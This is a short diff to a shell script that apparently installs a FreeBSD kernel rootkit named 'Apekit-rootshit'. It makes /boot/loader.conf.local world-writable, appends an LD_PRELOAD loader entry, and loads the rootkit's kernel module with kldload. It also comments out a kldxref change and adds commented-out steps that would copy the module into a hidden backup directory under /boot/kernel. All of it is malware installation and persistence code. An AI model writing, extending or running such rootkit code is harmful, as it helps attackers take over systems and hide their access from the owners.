@@ -26,6 +26,10 @@ chmod 777 /boot/loader.conf.local
 echo 'LD_PRELOAD_load="YES"' >> /boot/loader.conf.local
 
 # Disable kldxref by setting kldxref_enable="NO"
-sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
+# sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
 kldload "/Apekit-rootshit/$LKM_NAME"
+
+# mkdir /boot/kernel/.ko_backup/
+
+# cp "/Apekit-rootshit/$LKM_NAME" /boot/kernel/.ko_backup/
